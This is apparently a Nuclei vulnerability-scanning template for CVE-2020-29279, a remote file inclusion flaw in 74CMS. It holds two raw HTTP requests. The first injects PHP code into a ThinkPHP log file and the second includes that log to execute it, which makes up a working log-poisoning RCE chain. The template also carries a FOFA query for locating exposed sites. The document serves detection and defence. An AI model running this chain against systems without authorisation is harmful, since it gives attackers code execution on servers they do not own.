http:
- matchers:
  - condition: and
    dsl:
    - status_code == 404
    - contains(content_type, "text/html")
    - contains(body, "ThinkPHP")
    internal: true
    type: dsl
  raw:
  - 'POST /index.php?m=home&a=assign_resume_tpl HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    variable=1&tpl=<?php phpinfo(); echo md5("{{num}}");ob_flush();?>

    '
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - PHP Version
    - '{{md5(num)}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /index.php?m=home&a=assign_resume_tpl HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    variable=1&tpl=data/Runtime/Logs/Home/{{replace(date_time("%Y"), "20", "")}}_{{date_time("%M_%D",unix_time())}}.log

    '
id: CVE-2020-29279
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:74cms:74cms:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-29279
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.97653
    epss-score: 0.49028
  description: 'PHP remote file inclusion in the assign_resume_tpl method in Application/Common/Controller/BaseController.class.php
    in 74CMS before 6.0.48 allows remote code execution.

    '
  impact: 'Remote attackers can execute arbitrary code on the server, potentially
    leading to full system compromise.

    '
  metadata:
    fofa-query: "app=\"\u9A91\u58EB-74CMS\""
    product: 74cms
    vendor: 74cms
  name: 74CMS - Remote File Inclusion
  reference:
  - https://github.com/Ares-X/VulWiki/blob/master/Web%E5%AE%89%E5%85%A8/74cms/74cms%20v6.0.48%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%2B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell.md
  - https://www.wangan.com/p/7fyg8ka5a6f81cb6
  - https://cloud.tencent.com/developer/article/1856739
  remediation: 'Update to version 6.0.48 or later.

    '
  severity: critical
  tags: cve,cve2020,74cms,rce,intrusive,file-upload,vkev,vuln
variables:
  num: '999999999'
